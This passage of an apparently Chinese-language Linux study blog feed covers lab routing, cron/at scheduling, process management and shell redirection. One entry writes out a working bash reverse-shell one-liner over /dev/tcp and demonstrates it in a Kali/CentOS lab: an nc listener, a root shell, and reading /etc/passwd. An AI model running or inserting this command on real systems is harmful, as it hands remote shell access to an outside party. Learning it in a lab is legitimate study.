class="comment">#centos配置文件在/etc/sysconfig/network-scripts目录下的ifcfg-ensxxx文件</span></span><br><span class="line"><span class="comment">#双网卡的话就有两个文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#备份源配置文件</span></span><br><span class="line"><span class="built_in">mv</span> ifcfg-ens160 ifcfg-ens160.back</span><br><span class="line"><span class="built_in">mv</span> ifcfg-ens160 ifcfg-ens224.back</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建配置文件，因为这里centos相当于路由器，所以不配置网关和掩码</span></span><br><span class="line">vim ifcfg-ens160</span><br><span class="line"></span><br><span class="line">TYPE=Ethernet            <span class="comment">#接口类型</span></span><br><span class="line">DEVICE=ens160            <span class="comment">#网卡名称</span></span><br><span class="line">ONBOOT=<span class="built_in">yes</span>               <span class="comment">#开机自启动</span></span><br><span class="line">BOOTPROTO=static         <span class="comment">#静态ip</span></span><br><span class="line">IPADDR=192.168.2.254     <span class="comment">#ip地址</span></span><br><span class="line">DEFROUTE=<span class="built_in">yes</span>             <span class="comment">#默认路由，主网卡设置</span></span><br><span class="line"></span><br><span class="line">vim ifcfg-ens224</span><br><span class="line"></span><br><span class="line">TYPE=Ethernet</span><br><span class="line">DEVICE=ens224</span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=172.16.2.254</span><br><span class="line">DEFROUTE=no</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart NetworkManager</span><br></pre></td></tr></table></figure><p>③win 10配置ip</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807155943800.png"></p><p>④测试连通性</p><p>win10无法于kali通信</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160056221.png"></p><p>win10能和centos通信</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160152884.png"></p><p>kali能和centos通信</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160248802.png"></p><p>⑤修改centos配置文件，开启路由转发</p><p>在&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4目录下的ip_forward文件，这个文件默认为0且只读，但是可以通过重定向强制写入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#0表示关闭，1表示开启</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>此时测试kali能否与win10通信</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160741824.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160820847.png"></p><p>成功互通！！！！！！！</p><p>此章结束！！！！！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux计划任务</title>
      <link href="/2025/08/06/linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
      <url>/2025/08/06/linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>一、计划任务简介</p><p>在特定时间自动执行预先设定的命令和脚本</p><p>比如：定期备份，服务器运维，数据更新</p><p>二、Linux计划任务工具</p><p>1.at</p><p>适用场景：一次性&#x2F;延迟任务</p><p>时间粒度：秒级</p><p>特点：简单、轻量、无需持久化守护进程</p><p>基本语法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at 【选项】 时间表达式</span><br><span class="line"></span><br><span class="line">at支持灵活的时间表述</span><br><span class="line">now <span class="comment"># 立即执行</span></span><br><span class="line">now + 5min <span class="comment"># 5分钟后</span></span><br><span class="line">02:30 tomorrow/today <span class="comment"># 次日2:30</span></span><br><span class="line">2025-12-31 23:59 <span class="comment"># 绝对时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例</span></span><br><span class="line">at now +5 minutes</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl+d用于提交任务</span></span><br><span class="line"><span class="comment">#每个任务都有一个任务ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看所有待执行任务</span></span><br><span class="line">atq</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除任务</span></span><br><span class="line">atrm ID</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看任务内容</span></span><br><span class="line">at -C ID</span><br></pre></td></tr></table></figure><p>2.cron</p><p>适用场景：周期性任务</p><p>时间粒度：分钟级</p><p>特点：复杂，需长期运行守护进程</p><p>①cron核心功能</p><p>cron用于执行周期性任务</p><p>适用于以下场景：</p><ul><li>定时备份：每日&#x2F;每周自动备份数据。</li><li>日志清理：定时删除过期日志文件。</li><li>数据同步：每小时同步服务器间数据。</li><li>监控报警：检测服务状态并发送通知。</li></ul><p>②配置文件</p><p>cron有一个配置文件，是cron的编辑模板，路径为&#x2F;etc&#x2F;crontab</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@study ~]# <span class="built_in">cat</span> /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#minute表示分钟</span></span><br><span class="line"><span class="comment">#hour表示小时</span></span><br><span class="line"><span class="comment">#day of month表示一个月当中第几天</span></span><br><span class="line"><span class="comment">#munth表示第几个月</span></span><br><span class="line"><span class="comment">#day of week表示一周的第几天</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">10 2 * 7 2 /etc/bin/systemctl restart httpd</span><br><span class="line">表示7月份中每周二凌晨2点10分执行重启apache服务</span><br></pre></td></tr></table></figure><p>③管理命令</p><p>crontab -e：编辑任务</p><p>打开当前用户的~&#x2F;.crontab文件，支持bim编辑器，用于添加、修改、删除个人定时任务</p><p>crontab -l：列出任务</p><p>显示当前用户的所有计划任务</p><p>crontab -r：删除任务</p><p>永久删除当前用户的所有计划任务</p><p>crontab -u username：管理其他用户</p><p>用于查看&#x2F;编辑其他用户的计划任务</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux进程管理</title>
      <link href="/2025/08/06/linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2025/08/06/linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="一、进程简介"><a href="#一、进程简介" class="headerlink" title="一、进程简介"></a>一、进程简介</h1><h2 id="1-进程是什么"><a href="#1-进程是什么" class="headerlink" title="1.进程是什么"></a>1.进程是什么</h2><ul><li>程序在启动时、命令在执行时或服务在运行时会产生进程，产生一个或多个，这些进程来完成程序、命令或服务，所以进程是正在执行的程序的实例。</li></ul><h2 id="2-程序和进程"><a href="#2-程序和进程" class="headerlink" title="2.程序和进程"></a>2.程序和进程</h2><ul><li>程序： 是一组静态的指令代码，存储在磁盘上的文件中。它本身是“死的”，不占用系统资源（除了存储空间）。</li><li>进程： 是程序被加载到内存中开始运行后的动态实体。它是“活的”，需要操作系统为其分配和管理各种资源才能执行。</li></ul><h2 id="3-进程的状态"><a href="#3-进程的状态" class="headerlink" title="3.进程的状态"></a>3.进程的状态</h2><p>进程在其生命周期中会处于不同的状态：</p><ul><li>新建（new）： 进程正在被创建。</li><li>就绪（Runable）： 进程已获得除CPU之外的所有必要资源，等待被操作系统调度执行。</li><li>运行（Running）： 进程正在CPU上执行其指令。</li><li>阻塞&#x2F;等待（Stopped）： 进程因等待某个事件（如I&#x2F;O操作完成、信号量资源）而暂停执行。</li><li>终止&#x2F;退出： 进程执行完毕或被强制终止，等待操作系统回收其资源。</li><li>僵尸态（Zombie）：子进程先结束，但是父进程没有回收子进程。</li></ul><h2 id="4-进程PID"><a href="#4-进程PID" class="headerlink" title="4.进程PID"></a>4.进程PID</h2><p>每个进程由唯一的一个非负整数来标识，从1开始分配，通过PID能精确定位到具体进程。</p><p>PID的分配规则：</p><ul><li><p>取值范围</p><p>PID从 1 开始分配（系统启动后的第一个进程是 init 或 systemd ，PID&#x3D;1）。</p><p>最大PID值由内核参数 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 定义（默认通常为 32768 ）。</p><p>当PID达到最大值时，会循环使用已释放的PID（但不会重复分配给仍在运行的进程）。</p></li><li><p>回收机制</p></li></ul><p>​       进程终止后，其PID会被释放，供后续新进程使用</p><p>PID的特殊角色：</p><ul><li><p>PID&#x3D;1（systemd进程）</p><p>系统启动后的第一个进程，负责启动和管理其他所有用户进程。</p><p>如果PID&#x3D;1的进程终止，系统会触发内核恐慌（Kernel Panic）并崩溃。</p></li><li><p>父进程PID（PPID）</p><p>每个进程（除Init）都有父进程（Parent Process），父进程的PID称为 PPID。</p></li></ul><h2 id="5-进程字段解析"><a href="#5-进程字段解析" class="headerlink" title="5.进程字段解析"></a>5.进程字段解析</h2><ul><li>PID：进程 ID</li><li>PPID：父进程 ID</li><li>USER：进程所有者</li><li>%CPU：CPU 占用率</li><li>%MEM：内存占用率</li><li>VSZ：虚拟内存大小（KB）</li><li>RSS：物理内存大小（KB）</li><li>TTY：关联的终端</li><li>STAT：进程状态（如 S &#x3D;睡眠， R &#x3D;运行）</li><li>START：进程启动时间</li><li>TIME：累计 CPU 时间</li><li>COMMAND：启动命令（ [] 表示内核线程）</li></ul><h1 id="二、进程管理"><a href="#二、进程管理" class="headerlink" title="二、进程管理"></a>二、进程管理</h1><p>进程管理可以通过ps、top、kill来进行管理。</p><h2 id="1-ps"><a href="#1-ps" class="headerlink" title="1.ps"></a>1.ps</h2><p>ps是linux中查看当前系统进程状态的工具，用于静态查看进程，显示进程的详细信息，如：PID、CPU、运行时间、进程状态等等。</p><p>①基本语法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps 【选项】</span><br><span class="line"></span><br><span class="line"><span class="comment">#常用参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示所有进程（包括其他用户进程）</span></span><br><span class="line">-e或-A </span><br><span class="line"><span class="comment">#显示所有终端进程（除会话领导者）</span></span><br><span class="line">-a</span><br><span class="line"><span class="comment">#显示不关联终端的进程（如守护进程）</span></span><br><span class="line">-x</span><br><span class="line"><span class="comment">#显示指定用户的进程（如-u root）</span></span><br><span class="line">-u</span><br><span class="line"><span class="comment">#显示指定字段</span></span><br><span class="line">-o</span><br></pre></td></tr></table></figure><p>②常用搭配：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#显示所有进程详细信息，BSD风格</span></span><br><span class="line">ps aux</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示所有进程完整信息，Unix风格</span></span><br><span class="line">ps -ef</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示pid、用户、cpu占用、内存占用，按照cpu降序</span></span><br><span class="line">ps -eo pid,user,%cpu,%mem,cmd --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搭配grep来指定要显示内容</span></span><br><span class="line"><span class="comment">#显示httpd进程</span></span><br><span class="line">ps aux | grep httpd</span><br></pre></td></tr></table></figure><h2 id="2-top"><a href="#2-top" class="headerlink" title="2.top"></a>2.top</h2><p>top是linux中最常用的实时系统监控工具，用于动态显示进程资源占用和系统整体状态，提供交互式操作，用户能够快速分析性能瓶颈</p><p>①基础语法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动top</span></span><br><span class="line">top</span><br><span class="line"></span><br><span class="line"><span class="comment">#退出top</span></span><br><span class="line">q或Ctrl+C</span><br></pre></td></tr></table></figure><p>②界面解析</p><p>top 界面分为 摘要区（系统概览）和 进程列表区（实时进程信息）</p><p>上半部分（系统概览）<br>下半部分（进程列表）</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250806152548546.png"></p><p>③交互式命令</p><ul><li>k：终止进程（输入 PID，再输入信号，默认 SIGTERM ）。</li><li>r：调整进程优先级（输入 PID，再输入 Nice 值）。</li><li>P：按 CPU 使用率排序。</li><li>M：按内存使用率排序。</li><li>T：按运行时间排序。</li><li>N：按 PID 排序。</li><li>z：切换颜色高亮显示。</li><li>c：显示完整命令路径。</li><li>1：展开显示每个 CPU 核心的负载。</li><li>h：查看帮助信息。</li><li>空格：立即刷新界面。</li></ul><h2 id="3-kill"><a href="#3-kill" class="headerlink" title="3.kill"></a>3.kill</h2><p>kill命令可以用于刷新或者杀死进程</p><p>①信号控制</p><p>kill命令可以加上不同信号来完成对进程的不同操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有信号</span></span><br><span class="line"><span class="built_in">kill</span> -l</span><br><span class="line"></span><br><span class="line">[root@study 桌面]# <span class="built_in">kill</span> -l</span><br><span class="line"> 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP</span><br><span class="line"> 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL10) SIGUSR1</span><br><span class="line">11) SIGSEGV12) SIGUSR213) SIGPIPE14) SIGALRM15) SIGTERM</span><br><span class="line">16) SIGSTKFLT17) SIGCHLD18) SIGCONT19) SIGSTOP20) SIGTSTP</span><br><span class="line">21) SIGTTIN22) SIGTTOU23) SIGURG24) SIGXCPU25) SIGXFSZ</span><br><span class="line">26) SIGVTALRM27) SIGPROF28) SIGWINCH29) SIGIO30) SIGPWR</span><br><span class="line">31) SIGSYS34) SIGRTMIN35) SIGRTMIN+136) SIGRTMIN+237) SIGRTMIN+3</span><br><span class="line">38) SIGRTMIN+439) SIGRTMIN+540) SIGRTMIN+641) SIGRTMIN+742) SIGRTMIN+8</span><br><span class="line">43) SIGRTMIN+944) SIGRTMIN+1045) SIGRTMIN+1146) SIGRTMIN+1247) SIGRTMIN+13</span><br><span class="line">48) SIGRTMIN+1449) SIGRTMIN+1550) SIGRTMAX-1451) SIGRTMAX-1352) SIGRTMAX-12</span><br><span class="line">53) SIGRTMAX-1154) SIGRTMAX-1055) SIGRTMAX-956) SIGRTMAX-857) SIGRTMAX-7</span><br><span class="line">58) SIGRTMAX-659) SIGRTMAX-560) SIGRTMAX-461) SIGRTMAX-362) SIGRTMAX-2</span><br><span class="line">63) SIGRTMAX-164) SIGRTMAX</span><br></pre></td></tr></table></figure><p>总共64种信号</p><p>②常用信号</p><ul><li>1：SIGHUP (重载配置)&#x2F;重刷新一个进程，主要用户服务的刷新</li><li>9：SIGKILL (强制终止)&#x2F;杀掉一个进程，但不杀掉其子进程（centos7）</li><li>15：SIGTERM (正常终止)&#x2F;杀掉进程及其子进程</li><li>18：SIGCONT (恢复执行)</li><li>19：SIGSTOP (暂停)&#x2F;暂停一个进程</li></ul><p>用法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#杀死进程PID位1234的进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 1234</span><br></pre></td></tr></table></figure><p>PID为1的进程为系统进程，别使用kill进行杀死</p><h1 id="三、作业控制"><a href="#三、作业控制" class="headerlink" title="三、作业控制"></a>三、作业控制</h1><p>linux可以在一个终端中管理多个任务进程(这些进程称之为job)。有些进程会占用终端运行很久或是一直占用终端，那么想要运行第二进程就无法操作了，所以进程可以放到后台执行，这样就不影响在同一个终端运行第二个进程了</p><h2 id="前后台管理"><a href="#前后台管理" class="headerlink" title="前后台管理"></a>前后台管理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用sleep命令开启占用终端</span></span><br><span class="line"><span class="built_in">sleep</span> 10000&amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#‘&amp;’表示将sleep挂到后台运行，这样救不占用终端</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看后台运行作业</span></span><br><span class="line"><span class="built_in">jobs</span> -l</span><br><span class="line">[root@study 桌面]# <span class="built_in">jobs</span> -l</span><br><span class="line">[1]+  6659 运行中               <span class="built_in">sleep</span> 10000 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#作业调度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将后台任务调度到前台</span></span><br><span class="line"><span class="built_in">fg</span> %1 </span><br><span class="line"><span class="comment">#将后台暂停任务运行</span></span><br><span class="line"><span class="built_in">bg</span> %1</span><br><span class="line"></span><br><span class="line"><span class="comment">#%1表示作业号为1的作业</span></span><br><span class="line"><span class="comment">#用kill杀死时必须加上%1</span></span><br><span class="line"><span class="comment">#如果是kill 1表示杀死系统进程，谨慎操作</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux重定向与bash反弹</title>
      <link href="/2025/08/05/%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8Ebash%E5%8F%8D%E5%BC%B9/"/>
      <url>/2025/08/05/%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8Ebash%E5%8F%8D%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="一、重定向"><a href="#一、重定向" class="headerlink" title="一、重定向"></a>一、重定向</h1><h2 id="1-文件描述符（fd）"><a href="#1-文件描述符（fd）" class="headerlink" title="1.文件描述符（fd）"></a>1.文件描述符（fd）</h2><p>在linux系统中，文件描述符是一个非负整数（0、1、2、3……），它是用于唯一标识一个进程打开的文件、管道、网络连接或其他I&#x2F;O资源。</p><h2 id="2-标准流"><a href="#2-标准流" class="headerlink" title="2.标准流"></a>2.标准流</h2><p>linux中，每个进程会分配三个标准流，标准输入流、标准输出流、错误输出流，这三个流以三个不同的文件描述符进行标识。</p><p>①标准输入（stdin，fd 0）</p><p>  如键盘输入一个a</p><p>②标准输出（stdout，fd 1）</p><p>  如屏幕显示一个a</p><p>③错误输出（stderr，fd 2）</p><p>  如屏幕显示一个b</p><h2 id="3-重定向是什么"><a href="#3-重定向是什么" class="headerlink" title="3.重定向是什么"></a>3.重定向是什么</h2><p>重定向就是可以将一个输入或输出重定向到另一个文件当中</p><p>这里引入一个概念——-管道符，管道符的作用就是将前一个指令的输出作为后一个指令的输入，常用的管道符如:</p><p>&lt;</p><p>&lt;&lt;</p><p>|</p><p>&amp;</p><p>举个例子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#当输入</span></span><br><span class="line"><span class="built_in">echo</span> 123 &gt; 123.txt</span><br><span class="line">123会输入到123.txt当中，而不是回显到终端</span><br></pre></td></tr></table></figure><h1 id="二、重定向案例"><a href="#二、重定向案例" class="headerlink" title="二、重定向案例"></a>二、重定向案例</h1><h2 id="1-正确和错误都输入到相同位置"><a href="#1-正确和错误都输入到相同位置" class="headerlink" title="1.正确和错误都输入到相同位置"></a>1.正确和错误都输入到相同位置</h2><p>首先，我们新建一个目录，&#x2F;test1&#x2F;123</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /test1/123</span><br></pre></td></tr></table></figure><p>然后输入以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /test1 /test2</span><br><span class="line"><span class="comment">#正常返回这样</span></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2</span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br><span class="line">/test1:</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line"><span class="comment">#现在我们输入</span></span><br><span class="line"><span class="built_in">ls</span> /test1 /test2 &amp;&gt; 456.txt</span><br><span class="line"><span class="built_in">cat</span> 456.txt</span><br><span class="line"><span class="comment">#则返回</span></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2 &amp;&gt; 456.txt</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> 456.txt</span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br><span class="line">/test1:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>正确的输出和错误的输出已经保存在456.txt文件里面了</p><h2 id="2-将正确的输出和错误的输出重定向到不同文件"><a href="#2-将正确的输出和错误的输出重定向到不同文件" class="headerlink" title="2.将正确的输出和错误的输出重定向到不同文件"></a>2.将正确的输出和错误的输出重定向到不同文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /test1 /test2 1&gt; output.txt 2&gt; errorput.txt</span><br><span class="line"></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2 1&gt; output.txt 2&gt; errorput.txt</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> output.txt </span><br><span class="line">/test1:</span><br><span class="line">123</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> errorput.txt </span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p>可以看到指向了不同的文件</p><h2 id="3-将错误输出合并到正确输出，再一起重定向到文件"><a href="#3-将错误输出合并到正确输出，再一起重定向到文件" class="headerlink" title="3.将错误输出合并到正确输出，再一起重定向到文件"></a>3.将错误输出合并到正确输出，再一起重定向到文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /test1 /test2 &gt; 123.txt 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2 &gt; 123.txt 2&gt;&amp;1</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> 123.txt</span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br><span class="line">/test1:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>可以看到，进行合并并且指向了123.txt文件</p><p>这里的方式和案例1的结果其实差不多，这里的&amp;1标识的是文件标识符（fd），不是文件1，所以在进行合并的时候必须写上&amp;</p><h1 id="三、bash反弹"><a href="#三、bash反弹" class="headerlink" title="三、bash反弹"></a>三、bash反弹</h1><h2 id="1-shell是什么"><a href="#1-shell是什么" class="headerlink" title="1.shell是什么"></a>1.shell是什么</h2><p>shell就是一种解释器，用于用户和内核交互的桥梁，计算机只能读懂二进制语言，读不懂人类语言，所以需要一个解释器去进行翻译，比如你在终端输入一个ls，那么你的shell就将这个命令翻译为二进制，计算机内核才能读懂，才能处理你的命令</p><h2 id="2-bash是什么"><a href="#2-bash是什么" class="headerlink" title="2.bash是什么"></a>2.bash是什么</h2><p>bash就是shell的一种类型，是shell的具体实现，你的操作系统终端输入命令的地方就是bsah，但是bash不仅仅只能解释命令，如：ls、cat、vim等，它也能执行复杂流程，如运行脚本</p><h2 id="3-反弹bash"><a href="#3-反弹bash" class="headerlink" title="3.反弹bash"></a>3.反弹bash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.x.x/xxxx 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>命令解释</p><ul><li>bash -i</li></ul><p>打开一个交互的bash，就是命令行</p><ul><li>&#x2F;dev&#x2F;tcp&#x2F;</li></ul><p>linux中的特殊设备，打开这个文件相当于发送一个socket调用，建立socket连接，后续在这个连接中传输数据</p><ul><li>&#x2F;dev&#x2F;tcp&#x2F;192.168.x.x&#x2F;xxxx</li></ul><p>向192.168.x.x:xxxx发起连接</p><ul><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.x.x&#x2F;xxxx</li></ul><p>将正确输出和错误输重定向到这个连接</p><ul><li>0&gt;&amp;1</li></ul><p>将标准输入与正确输出合并，并一起重定向到这个连接</p><h2 id="4-实操"><a href="#4-实操" class="headerlink" title="4.实操"></a>4.实操</h2><p>实验机：kali、centos8</p><p>①在kali上，使用nc工具监听1234端口（端口可以自定义）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lnvp 1324</span><br><span class="line"><span class="comment">#正常返回这个</span></span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nc -lnvp 1234 </span><br><span class="line">listening on [any] 1234 ...</span><br></pre></td></tr></table></figure><p>②在centos上，执行反弹命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先查看kali的ip</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment">#在centos上输入，这里的ip地址输入kali的地址，端口输入你监听的端口</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.x.x/xxxx 0&gt;&amp;1</span><br><span class="line"><span class="comment">#再次返回到kali，出现以下bash表示成功</span></span><br><span class="line">                                                                             </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nc -lnvp 1234 </span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.18.169] from (UNKNOWN) [192.168.18.168] 42486</span><br><span class="line">[root@study /]# </span><br></pre></td></tr></table></figure><p>③试着执行命令，如查看&#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure><p>到此，本章内容结束！！！</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux搭建apache服务器</title>
      <link href="/2025/08/04/linux%E6%90%AD%E5%BB%BAapache%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2025/08/04/linux%E6%90%AD%E5%BB%BAapache%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一、搭建环境"><a href="#一、搭建环境" class="headerlink" title="一、搭建环境"></a>一、搭建环境</h1><p>操作系统：CentOS 8</p><p>服务器：apache</p><p>镜像源：<a href="https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo">https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo</a></p><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><h2 id="1-下载镜像"><a href="#1-下载镜像" class="headerlink" title="1.下载镜像"></a>1.下载镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo</span><br></pre></td></tr></table></figure><h2 id="2-下载apache服务"><a href="#2-下载apache服务" class="headerlink" title="2.下载apache服务"></a>2.下载apache服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载apache</span></span><br><span class="line">yum install httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装完成后，开启apache服务</span></span><br><span class="line">systemctl start httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查状态，出现如下页面证明成功开启</span></span><br><span class="line">systemctl status httpd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804154607959.png"></p><h2 id="3-apache配置文件介绍"><a href="#3-apache配置文件介绍" class="headerlink" title="3.apache配置文件介绍"></a>3.apache配置文件介绍</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在下载apache时，会自动生成apache配置文件</span></span><br><span class="line"><span class="comment">#检查配置文件</span></span><br><span class="line"><span class="comment">#apache主配置文件，路径为/etc/httpd/conf/httpd.conf</span></span><br><span class="line"><span class="comment">#apache虚拟主机配置文件，路径为/etc/httpd/conf.d</span></span><br><span class="line"><span class="comment">#apache自定义配置文件，存放在虚拟主机配置文件目录下，如：/etc/httpd/conf.d/mywebsite.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以检查系统新增系统服务，验证apache服务</span></span><br><span class="line">systemctl list-unit-files | grep http</span><br><span class="line"></span><br><span class="line">[root@localhost /]# systemctl list-unit-files | grep http</span><br><span class="line">httpd.service                              disabled </span><br><span class="line">httpd@.service                             disabled </span><br><span class="line">httpd.socket                               disabled </span><br><span class="line"></span><br><span class="line"><span class="comment">#检查新增的apache进程</span></span><br><span class="line">ps aux | grep httpd</span><br><span class="line"></span><br><span class="line">[root@localhost /]# ps aux | grep httpd</span><br><span class="line">root      32866  0.0  1.3 273860 10700 ?        Ss   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32870  0.0  1.0 286076  8244 ?        S    15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32872  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32873  0.0  1.6 1933752 13600 ?       Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32876  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">root      33313  0.0  0.1  12320   992 pts/0    S+   15:56   0:00 grep --color=auto httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查新增日志文件</span></span><br><span class="line"><span class="built_in">ls</span> -l /var/log/httpd</span><br><span class="line"></span><br><span 